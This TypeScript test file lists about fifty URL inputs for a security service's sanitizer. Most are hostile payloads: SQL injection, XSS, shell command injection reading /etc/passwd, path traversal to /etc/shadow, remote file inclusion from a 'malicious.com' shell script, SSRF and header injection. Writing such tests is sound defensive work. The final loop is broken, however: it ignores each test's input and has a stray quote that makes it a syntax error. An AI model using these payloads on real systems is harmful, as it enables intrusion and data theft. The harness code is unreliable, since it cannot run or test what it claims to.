import { NSS as service } from "../services/NehonixSecurity.service";

const tests = [
  {
    description: "Basic SQL injection",
    input:
      "http://example.com/api?query=SELECT%20*%20FROM%20users%20WHERE%201=1--",
    component: "query",
  },
  {
    description: "Encoded SQL injection with comment",
    input: "http://example.com/search?q=%27%20OR%201=1%20--",
    component: "query",
  },
  {
    description: "Time-delay SQL injection attempt",
    input: "http://example.com/api?id=1%20AND%20SLEEP(5)",
    component: "query",
  },
  {
    description: "SQL CASE statement for blind injection",
    input:
      "http://example.com/data?input=CASE%20WHEN%201=1%20THEN%201%20ELSE%200%20END",
    component: "query",
  },
  {
    description: "Script tag in URL query",
    input: "http://example.com/page?data=%3Cscript%3Ealert('XSS')%3C/script%3E",
    component: "query",
  },
  {
    description: "JavaScript protocol handler",
    input: "http://example.com/redirect?url=javascript:alert('XSS')",
    component: "query",
  },
  {
    description: "SVG with event handler",
    input: "http://example.com/svg?content=%3Csvg%20onload=alert('XSS')%3E",
    component: "query",
  },
  {
    description: "Encoded HTML entities for XSS bypass",
    input: "http://example.com/input?text=<script>alert('XSS')</script>",
    component: "query",
  },
  {
    description: "Command injection with networking command",
    input: "http://example.com/exec?cmd=;ping%20localhost",
    component: "query",
  },
  {
    description: "Command substitution syntax",
    input: "http://example.com/run?command=$(whoami)",
    component: "query",
  },
  {
    description: "Encoded command injection",
    input: "http://example.com/api?input=%5C%5C%5C%5C%5C%5C%5C%5Cwhoami",
    component: "query",
  },
  {
    description: "Bash variable substitution",
    input: "http://example.com/shell?cmd=${IFS}cat%20/etc/passwd",
    component: "query",
  },
  {
    description: "Directory traversal attempt",
    input: "http://example.com/file?path=../../etc/passwd",
    component: "query",
  },
  {
    description: "Encoded directory traversal",
    input: "http://example.com/download?file=%2e%2e%2f%2e%2e%2fetc%2fshadow",
    component: "query",
  },
  {
    description: "Unicode normalized traversal",
    input: "http://example.com/api?path=%c0%ae%c0%ae/etc/passwd",
    component: "query",
  },
  {
    description: "Null byte injection in traversal",
    input: "http://example.com/file?path=../../etc/passwd%00",
    component: "query",
  },
  {
    description: "Remote file inclusion attempt",
    input: "http://example.com/include?file=http://malicious.com/shell.php",
    component: "query",
  },
  {
    description: "PHP filter wrapper for code disclosure",
    input:
      "http://example.com/page?file=php://filter/convert.base64-encode/resource=index.php",
    component: "query",
  },
  {
    description: "Protocol-relative file inclusion",
    input: "http://example.com/include?file=//malicious.com/script",
    component: "query",
  },
  {
    description: "Open redirect to external domain",
    input: "http://example.com/redirect?url=http://malicious.com",
    component: "query",
  },
  {
    description: "JavaScript protocol in redirect",
    input: "http://example.com/goto?next=javascript:alert('XSS')",
    component: "query",
  },
  {
    description: "Encoded protocol in redirect",
    input: "http://example.com/return?link=https%3A%2F%2Fmalicious.com",
    component: "query",
  },
  {
    description: "SSRF targeting localhost",
    input: "http://example.com/fetch?url=http://localhost:8080",
    component: "query",
  },
  {
    description: "SSRF to private IP",
    input: "http://example.com/api?endpoint=http://192.168.1.1",
    component: "query",
  },
  {
    description: "SSRF with unusual protocol",
    input: "http://example.com/proxy?url=gopher://server:70",
    component: "query",
  },
  {
    description: "CRLF injection with HTTP header",
    input: "http://example.com/set?data=%0D%0ASet-Cookie:%20session=malicious",
    component: "query",
  },
  {
    description: "Encoded CRLF injection",
    input:
      "http://example.com/log?input=%25%30%44%25%30%41Location:%20http://malicious.com",
    component: "query",
  },
  {
    description: "HTTP header injection attempt",
    input: "http://example.com/api?header=Host:%20malicious.com%0D%0A",
    component: "query",
  },
  {
    description: "Unicode CRLF for header injection",
    input: "http://example.com/set?data=%E5%98%8D%E5%98%8AHost:malicious.com",
    component: "query",
  },
  {
    description: "Base64-encoded payload",
    input: "http://example.com/data?input=SGVsbG8gV29ybGQ=",
    component: "query",
  },
  {
    description: "Double URL encoding",
    input: "http://example.com/query?data=%2525%253Cscript%2525%253E",
    component: "query",
  },
  {
    description: "Long percent-encoded sequence",
    input:
      "http://example.com/input?text=%25%31%32%25%33%34%25%35%36%25%37%38%25%39%30",
    component: "query",
  },
  {
    description: "Unicode control characters for evasion",
    input:
      "http://example.com/page?input=%E2%80%8F<script>alert('XSS')</script>",
    component: "query",
  },
  {
    description: "Unicode formatting characters",
    input: "http://example.com/data?text=\u200eSELECT%20*%20FROM%20users",
    component: "query",
  },
  {
    description: "Punycode domain for homograph attack",
    input: "http://xn--pple-43d.com/login",
    component: "input",
  },
  {
    description: "Cyrillic characters mimicking Latin",
    input: "http://goоgle.com/auth",
    component: "input",
  },
  {
    description: "Fragment with HTML special characters",
    input: "http://example.com/page?data=test#<script>alert('XSS')</script>",
    component: "fragment",
  },
  {
    description: "Encoded fragment payload",
    input: "http://example.com/home?x=y#data=%3Cscript%3E",
    component: "fragment",
  },
  {
    description: "PHP serialized object",
    input:
      'http://example.com/api?data=O:8:"stdClass":1:{s:3:"cmd";s:6:"whoami";}',
    component: "query",
  },
  {
    description: "JSON.NET serialization exploit",
    input:
      'http://example.com/data?input={"$type":"System.Diagnostics.Process, System"}',
    component: "query",
  },
  {
    description: "Flask/Jinja2 template injection",
    input: "http://example.com/template?data={{config}}",
    component: "query",
  },
  {
    description: "Spring Expression Language injection",
    input:
      "http://example.com/expr?input=${T(java.lang.Runtime).getRuntime().exec('whoami')}",
    component: "query",
  },
  {
    description: "Suspicious parameter name",
    input: "http://example.com/api?cmd=run",
    component: "query",
  },
  {
    description: "Credential-related parameter",
    input: "http://example.com/login?password=secret",
    component: "query",
  },
  {
    description: "Data URI with HTML content",
    input:
      "http://example.com/link?url=data:text/html,<script>alert('XSS')</script>",
    component: "query",
  },
  {
    description: "Long Base64 data URI",
    input:
      "http://example.com/image?src=data:application/octet-stream;base64,SGVsbG8gV29ybGQgSGVsbG8gV29ybGQgSGVsbG8gV29ybGQgSGVsbG8gV29ybGQ=",
    component: "query",
  },
  {
    description: "Safe URL with query parameters",
    input: "http://example.com/search?q=hello%20world",
    component: "query",
  },
  {
    description: "Normal text input",
    input: "This is a safe string with no malicious content",
    component: "input",
  },
  {
    description: "Simple Base64 without malicious intent",
    input: "http://example.com/data?text=SGVsbG8=",
    component: "query",
  },
  {
    description: "Complex but safe URL",
    input:
      "https://example.com/shop?category=books&sort=price&filter=new%20releases",
    component: "query",
  },
];

tests.forEach((test, index) => {
  console.log(`Test ${index + 1}: ${test.description}`);
  const result = service.sanitizeInput("https://example.com/shop?category=books&sort=price&filter=new%20releases"");
  console.log("Result:", JSON.stringify(result, null, 2));
  console.log("---");
});
